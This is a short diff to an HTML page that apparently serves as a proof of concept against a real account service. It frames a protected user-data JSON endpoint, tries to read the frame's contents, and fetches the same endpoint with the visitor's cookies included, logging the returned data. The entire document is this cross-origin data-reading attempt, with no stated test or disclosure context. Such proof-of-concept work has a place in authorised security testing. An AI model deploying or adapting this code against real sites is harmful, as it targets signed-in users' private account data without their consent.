@@ -10,6 +10,17 @@
         let frame = document.createElement("iframe");
         frame.src = "https://accounts.sap.com/ui/protected/userData/json";
         document.body.appendChild(frame);
+
+        frame.onload = function() {
+    console.log(frame.contentWindow.document.body.innerHTML);
+};
+
+        fetch("https://accounts.sap.com/ui/protected/userData/json", {
+    credentials: "include"  // Include authentication cookies if needed
+})
+.then(response => response.json())
+.then(data => console.log(data))
+.catch(error => console.error("Error:", error));
     </script>
 </body>
 </html>
